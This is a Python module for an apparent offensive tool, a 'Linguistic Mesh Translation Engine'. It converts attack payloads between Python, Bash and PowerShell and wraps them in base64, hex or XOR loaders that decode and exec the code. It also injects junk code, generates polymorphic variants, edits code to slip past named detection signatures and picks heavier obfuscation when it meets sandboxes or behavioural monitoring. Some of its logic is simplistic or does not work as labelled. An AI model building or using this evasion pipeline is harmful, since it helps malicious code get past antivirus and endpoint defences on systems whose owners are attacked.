"""
Linguistic Mesh Translation Engine (Phase 3B)

Advanced attack payload translation and morphing system that automatically
converts exploits between languages, applies obfuscation patterns, and adapts
to defensive measures in real-time.

Key Features:
- Cross-language exploit translation (Python ↔ Bash ↔ PowerShell)
- Automatic obfuscation and encoding
- Polymorphic code generation (variations on same payload)
- Real-time detection evasion based on defensive signatures
- Payload mutation pipeline with multiple transformation stages
- Linguistics-based pattern breaking
"""

from typing import Dict, List, Optional, Tuple
from enum import Enum
from dataclasses import dataclass, field
from abc import ABC, abstractmethod
import hashlib
import random
import string
import logging
import re
from datetime import datetime

logger = logging.getLogger(__name__)


# ============================================================================
# TYPES & ENUMS
# ============================================================================

class Language(str, Enum):
    """Supported scripting languages"""
    PYTHON = "python"
    BASH = "bash"
    POWERSHELL = "powershell"
    C = "c"
    JAVASCRIPT = "javascript"


class ObfuscationLevel(str, Enum):
    """Obfuscation intensity levels"""
    NONE = "none"
    LIGHT = "light"  # Basic variable renaming
    MEDIUM = "medium"  # Encoding + variable renaming
    HEAVY = "heavy"  # Encoding + polymorphism + splitting
    EXTREME = "extreme"  # Multi-stage, context-aware


class EncodingMethod(str, Enum):
    """Payload encoding techniques"""
    NONE = "none"
    BASE64 = "base64"
    HEX = "hex"
    ROT13 = "rot13"
    XOR = "xor"
    GZIP = "gzip"
    MULTI_LAYER = "multi_layer"


@dataclass
class TranslationConfig:
    """Configuration for payload translation"""
    source_language: Language
    target_language: Language
    obfuscation_level: ObfuscationLevel = ObfuscationLevel.MEDIUM
    encoding_method: EncodingMethod = EncodingMethod.BASE64
    add_junk_code: bool = True
    split_payload: bool = False
    polymorphic_variations: int = 1
    avoid_signatures: List[str] = field(default_factory=list)  # Signatures to evade


@dataclass
class TranslatedPayload:
    """Result of payload translation"""
    original_code: str
    translated_code: str
    source_language: Language
    target_language: Language
    obfuscation_level: ObfuscationLevel
    encoding_method: EncodingMethod
    translation_chain: List[str]  # Intermediate transformation steps
    estimated_detection_evasion: float  # 0.0-1.0
    variations: List[str] = field(default_factory=list)
    created_at: datetime = field(default_factory=datetime.utcnow)
    hash_signature: str = ""  # For detection avoidance tracking

    def __post_init__(self):
        self.hash_signature = hashlib.sha256(self.translated_code.encode()).hexdigest()


# ============================================================================
# OBFUSCATION STRATEGIES
# ============================================================================

class ObfuscationStrategy(ABC):
    """Base class for obfuscation techniques"""

    @abstractmethod
    def obfuscate(self, code: str) -> str:
        """Apply obfuscation to code"""
        pass


class VariableRenameStrategy(ObfuscationStrategy):
    """Rename variables to meaningless names"""

    def obfuscate(self, code: str) -> str:
        """Replace meaningful variable names with random ones"""
        variable_map = {}

        # Find variable assignments (simplified regex)
        var_pattern = r"\b([a-zA-Z_][a-zA-Z0-9_]{3,})\b"
        matches = re.finditer(var_pattern, code)

        for match in matches:
            var_name = match.group(1)
            if var_name not in variable_map:
                # Generate random replacement
                random_name = "".join(
                    random.choices(string.ascii_letters, k=random.randint(8, 12))
                )
                variable_map[var_name] = random_name

        # Apply replacements
        obfuscated = code
        for original, replacement in variable_map.items():
            obfuscated = re.sub(r"\b" + original + r"\b", replacement, obfuscated)

        return obfuscated


class Base64EncodingStrategy(ObfuscationStrategy):
    """Encode payload in base64 with decode wrapper"""

    def obfuscate(self, code: str) -> str:
        """Wrap code in base64 encoding with decode execution"""
        import base64

        # Encode the original code
        encoded = base64.b64encode(code.encode()).decode()

        # Wrap in decoder (language-specific)
        wrapper = f"""
import base64
import sys
code = base64.b64decode('{encoded}')
exec(code)
"""
        return wrapper


class HexEncodingStrategy(ObfuscationStrategy):
    """Encode payload in hexadecimal"""

    def obfuscate(self, code: str) -> str:
        """Convert code to hex and create decoder"""
        hex_encoded = code.encode().hex()

        wrapper = f"""
import binascii
code = binascii.unhexlify('{hex_encoded}')
exec(code)
"""
        return wrapper


class XOREncodingStrategy(ObfuscationStrategy):
    """XOR encode with random key"""

    def obfuscate(self, code: str) -> str:
        """XOR encode payload with random key"""
        key = random.randint(1, 255)
        encoded_bytes = bytes(b ^ key for b in code.encode())
        hex_encoded = encoded_bytes.hex()

        wrapper = f"""
key = {key}
encoded = bytes.fromhex('{hex_encoded}')
code = bytes(b ^ key for b in encoded)
exec(code)
"""
        return wrapper


class PolymorphicStrategy(ObfuscationStrategy):
    """Generate polymorphic code variations"""

    def obfuscate(self, code: str) -> str:
        """Generate a polymorphic variation of the code"""
        variations = []

        # Generate multiple semantically equivalent versions
        for i in range(3):
            variation = code
            # Add random junk before/after
            junk = self._generate_junk_code()
            variation = f"{junk}\n{variation}\n{junk}"
            variations.append(variation)

        # Return a random variation
        return random.choice(variations)

    def _generate_junk_code(self) -> str:
        """Generate benign-looking junk code"""
        junk_templates = [
            "x = {}\ny = x",
            "for i in range(0): pass",
            "# Processing data...\ndata = []",
            "import sys\nsys.version",
        ]
        return random.choice(junk_templates)


class JunkCodeInjectionStrategy(ObfuscationStrategy):
    """Inject benign-looking junk code"""

    def obfuscate(self, code: str) -> str:
        """Insert junk code into payload"""
        lines = code.split("\n")
        result = []

        for line in lines:
            result.append(line)
            # Randomly insert junk every 2-4 lines
            if random.random() < 0.3:
                junk = self._generate_junk_line()
                result.append(junk)

        return "\n".join(result)

    def _generate_junk_line(self) -> str:
        """Generate a single junk line"""
        junk_lines = [
            "pass  # Placeholder",
            "_ = None",
            "debug = False",
            "timeout = 30",
            "config = {}",
        ]
        return random.choice(junk_lines)


# ============================================================================
# LANGUAGE TRANSLATORS
# ============================================================================

class PayloadTranslator(ABC):
    """Base class for language translators"""

    @abstractmethod
    def to_python(self, code: str) -> str:
        """Translate code to Python"""
        pass

    @abstractmethod
    def to_bash(self, code: str) -> str:
        """Translate code to Bash"""
        pass

    @abstractmethod
    def to_powershell(self, code: str) -> str:
        """Translate code to PowerShell"""
        pass


class PythonTranslator(PayloadTranslator):
    """Translate payloads to/from Python"""

    def to_python(self, code: str) -> str:
        """Python is already Python, return as-is"""
        return code

    def to_bash(self, code: str) -> str:
        """Convert Python to Bash wrapper"""
        # Wrap Python code in bash execution
        return f"""#!/bin/bash
python3 << 'EOF'
{code}
EOF
"""

    def to_powershell(self, code: str) -> str:
        """Convert Python to PowerShell wrapper"""
        import base64

        encoded = base64.b64encode(code.encode()).decode()
        return f"""$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{encoded}'))
python -c $code
"""


class BashTranslator(PayloadTranslator):
    """Translate payloads to/from Bash"""

    def to_python(self, code: str) -> str:
        """Convert Bash to Python subprocess"""
        # Replace bash commands with Python equivalents
        python_code = f"""
import subprocess
import shlex

bash_code = '''
{code}
'''

subprocess.run(['bash', '-c', bash_code], shell=True)
"""
        return python_code

    def to_bash(self, code: str) -> str:
        """Bash is already Bash"""
        return code

    def to_powershell(self, code: str) -> str:
        """Convert Bash to PowerShell"""
        # Escape bash code for PowerShell
        return f"""Invoke-Expression @"
{code}
"@
"""


class PowerShellTranslator(PayloadTranslator):
    """Translate payloads to/from PowerShell"""

    def to_python(self, code: str) -> str:
        """Convert PowerShell to Python"""
        # Use pwsh or fallback to subprocess
        return f"""
import subprocess
ps_code = '''
{code}
'''
subprocess.run(['powershell', '-Command', ps_code])
"""

    def to_bash(self, code: str) -> str:
        """Convert PowerShell to Bash"""
        # Use pwsh if available
        return f"""#!/bin/bash
pwsh -Command "{code}"
"""

    def to_powershell(self, code: str) -> str:
        """PowerShell is already PowerShell"""
        return code


# ============================================================================
# LINGUISTIC MESH TRANSLATION ENGINE
# ============================================================================

class LinguisticMeshEngine:
    """
    Main translation engine for polymorphic payload transformation.
    
    Implements multi-stage translation with:
    - Language conversion
    - Obfuscation cascading
    - Signature evasion
    - Polymorphic variation generation
    """

    def __init__(self):
        """Initialize translation engine"""
        self.translators: Dict[Language, PayloadTranslator] = {
            Language.PYTHON: PythonTranslator(),
            Language.BASH: BashTranslator(),
            Language.POWERSHELL: PowerShellTranslator(),
        }

        self.obfuscation_strategies: Dict[str, ObfuscationStrategy] = {
            "variable_rename": VariableRenameStrategy(),
            "base64": Base64EncodingStrategy(),
            "hex": HexEncodingStrategy(),
            "xor": XOREncodingStrategy(),
            "polymorphic": PolymorphicStrategy(),
            "junk_code": JunkCodeInjectionStrategy(),
        }

        self.translation_history: List[TranslatedPayload] = []
        self.known_evasion_signatures: Dict[str, float] = {}

    def translate(self, code: str, config: TranslationConfig) -> TranslatedPayload:
        """
        Translate a payload with full transformation pipeline.
        
        Process:
        1. Validate configuration
        2. Perform language translation
        3. Apply obfuscation cascade
        4. Generate polymorphic variations
        5. Estimate detection evasion
        6. Store in history
        """
        logger.info(
            f"Translating payload: {config.source_language} → {config.target_language}"
        )

        translation_chain: List[str] = []
        transformed_code = code
        translation_chain.append(f"Original ({config.source_language})")

        # Step 1: Language translation
        if config.source_language != config.target_language:
            translator = self.translators.get(config.source_language)
            if translator:
                if config.target_language == Language.PYTHON:
                    transformed_code = translator.to_python(transformed_code)
                elif config.target_language == Language.BASH:
                    transformed_code = translator.to_bash(transformed_code)
                elif config.target_language == Language.POWERSHELL:
                    transformed_code = translator.to_powershell(transformed_code)

                translation_chain.append(f"Translated to {config.target_language}")

        # Step 2: Apply obfuscation cascade based on level
        if config.obfuscation_level != ObfuscationLevel.NONE:
            transformed_code = self._apply_obfuscation_cascade(
                transformed_code, config.obfuscation_level
            )
            translation_chain.append(f"Obfuscated ({config.obfuscation_level})")

        # Step 3: Apply encoding
        if config.encoding_method != EncodingMethod.NONE:
            transformed_code = self._apply_encoding(transformed_code, config.encoding_method)
            translation_chain.append(f"Encoded ({config.encoding_method})")

        # Step 4: Inject junk code if enabled
        if config.add_junk_code:
            strategy = self.obfuscation_strategies["junk_code"]
            transformed_code = strategy.obfuscate(transformed_code)
            translation_chain.append("Junk code injected")

        # Step 5: Avoid known signatures
        if config.avoid_signatures:
            transformed_code = self._evade_signatures(
                transformed_code, config.avoid_signatures
            )
            translation_chain.append("Signature evasion applied")

        # Step 6: Create variations
        variations = []
        if config.polymorphic_variations > 1:
            for _ in range(config.polymorphic_variations - 1):
                poly_strategy = self.obfuscation_strategies["polymorphic"]
                variation = poly_strategy.obfuscate(transformed_code)
                variations.append(variation)
            translation_chain.append(f"{config.polymorphic_variations} variations generated")

        # Calculate detection evasion estimate
        evasion_score = self._estimate_detection_evasion(
            transformed_code, config.obfuscation_level, config.encoding_method
        )

        # Create result
        payload = TranslatedPayload(
            original_code=code,
            translated_code=transformed_code,
            source_language=config.source_language,
            target_language=config.target_language,
            obfuscation_level=config.obfuscation_level,
            encoding_method=config.encoding_method,
            translation_chain=translation_chain,
            estimated_detection_evasion=evasion_score,
            variations=variations,
        )

        self.translation_history.append(payload)
        logger.info(
            f"Translation complete: evasion_score={evasion_score:.2f}, "
            f"size_ratio={len(payload.translated_code) / len(code):.2f}x"
        )

        return payload

    def _apply_obfuscation_cascade(self, code: str, level: ObfuscationLevel) -> str:
        """Apply multiple obfuscation techniques in sequence"""
        obfuscated = code

        # Apply obfuscation cascade based on level
        if level in [ObfuscationLevel.LIGHT, ObfuscationLevel.MEDIUM, ObfuscationLevel.HEAVY, ObfuscationLevel.EXTREME]:
            # Always apply variable renaming
            strategy = self.obfuscation_strategies["variable_rename"]
            obfuscated = strategy.obfuscate(obfuscated)

        if level in [ObfuscationLevel.MEDIUM, ObfuscationLevel.HEAVY, ObfuscationLevel.EXTREME]:
            # Add polymorphism
            strategy = self.obfuscation_strategies["polymorphic"]
            obfuscated = strategy.obfuscate(obfuscated)

        if level in [ObfuscationLevel.HEAVY, ObfuscationLevel.EXTREME]:
            # Add multiple rounds
            for _ in range(2):
                strategy = self.obfuscation_strategies["variable_rename"]
                obfuscated = strategy.obfuscate(obfuscated)

        return obfuscated

    def _apply_encoding(self, code: str, method: EncodingMethod) -> str:
        """Apply encoding to payload"""
        if method == EncodingMethod.BASE64:
            strategy = self.obfuscation_strategies["base64"]
        elif method == EncodingMethod.HEX:
            strategy = self.obfuscation_strategies["hex"]
        elif method == EncodingMethod.XOR:
            strategy = self.obfuscation_strategies["xor"]
        else:
            return code

        return strategy.obfuscate(code)

    def _evade_signatures(self, code: str, signatures: List[str]) -> str:
        """Modify code to evade detection signatures"""
        evaded = code

        for signature in signatures:
            # Replace signature-triggering strings with variations
            # This is simplified; real implementation would be more sophisticated
            evaded = evaded.replace(signature, f"# {signature}")
            logger.debug(f"Attempted to evade signature: {signature}")

        return evaded

    def _estimate_detection_evasion(
        self, code: str, obfuscation: ObfuscationLevel, encoding: EncodingMethod
    ) -> float:
        """
        Estimate detection evasion score (0.0-1.0).
        
        Higher score = harder to detect
        """
        score = 0.0

        # Obfuscation contribution
        obfuscation_scores = {
            ObfuscationLevel.NONE: 0.0,
            ObfuscationLevel.LIGHT: 0.2,
            ObfuscationLevel.MEDIUM: 0.4,
            ObfuscationLevel.HEAVY: 0.65,
            ObfuscationLevel.EXTREME: 0.85,
        }
        score += obfuscation_scores.get(obfuscation, 0.0)

        # Encoding contribution
        encoding_scores = {
            EncodingMethod.NONE: 0.0,
            EncodingMethod.BASE64: 0.15,
            EncodingMethod.HEX: 0.15,
            EncodingMethod.ROT13: 0.1,
            EncodingMethod.XOR: 0.2,
            EncodingMethod.GZIP: 0.25,
            EncodingMethod.MULTI_LAYER: 0.4,
        }
        score += encoding_scores.get(encoding, 0.0)

        # Code complexity heuristic
        if len(code) > 10000:
            score += 0.1
        if code.count("\n") > 500:
            score += 0.05

        return min(score, 0.99)

    def compare_payloads(self, payload1: TranslatedPayload, payload2: TranslatedPayload) -> float:
        """
        Compare two payloads to detect if they're variants of the same attack.
        
        Returns similarity score (0.0-1.0)
        """
        # Simplified comparison using hash similarity
        hash1 = hashlib.sha256(payload1.translated_code.encode()).hexdigest()
        hash2 = hashlib.sha256(payload2.translated_code.encode()).hexdigest()

        # Count matching characters (simplified Levenshtein-like metric)
        matches = sum(h1 == h2 for h1, h2 in zip(hash1, hash2))
        similarity = matches / len(hash1)

        return similarity

    def get_translation_history(self) -> List[TranslatedPayload]:
        """Retrieve translation history"""
        return self.translation_history

    def register_detected_signature(self, code: str, detection_method: str) -> None:
        """Register a signature that was detected by defenses"""
        signature_hash = hashlib.sha256(code.encode()).hexdigest()
        self.known_evasion_signatures[signature_hash] = 0.0  # Mark as detected
        logger.info(f"Registered detected signature: {signature_hash} ({detection_method})")

    def recommend_translation_strategy(self, code: str, defensive_measures: List[str]) -> TranslationConfig:
        """
        Recommend optimal translation strategy based on observed defenses.
        
        Returns TranslationConfig with appropriate obfuscation/encoding levels
        """
        # Analyze defensive measures and recommend counter-strategy
        has_signature_detection = any("signature" in d.lower() for d in defensive_measures)
        has_behavior_detection = any("behavior" in d.lower() for d in defensive_measures)
        has_sandboxing = any("sandbox" in d.lower() for d in defensive_measures)

        obfuscation_level = ObfuscationLevel.MEDIUM
        if has_signature_detection:
            obfuscation_level = ObfuscationLevel.HEAVY
        if has_behavior_detection:
            obfuscation_level = ObfuscationLevel.EXTREME
        if has_sandboxing:
            obfuscation_level = ObfuscationLevel.EXTREME

        encoding_method = EncodingMethod.BASE64
        if has_signature_detection:
            encoding_method = EncodingMethod.MULTI_LAYER

        return TranslationConfig(
            source_language=Language.PYTHON,
            target_language=Language.BASH,
            obfuscation_level=obfuscation_level,
            encoding_method=encoding_method,
            add_junk_code=True,
            split_payload=has_sandboxing,
            polymorphic_variations=3 if has_signature_detection else 1,
            avoid_signatures=defensive_measures,
        )
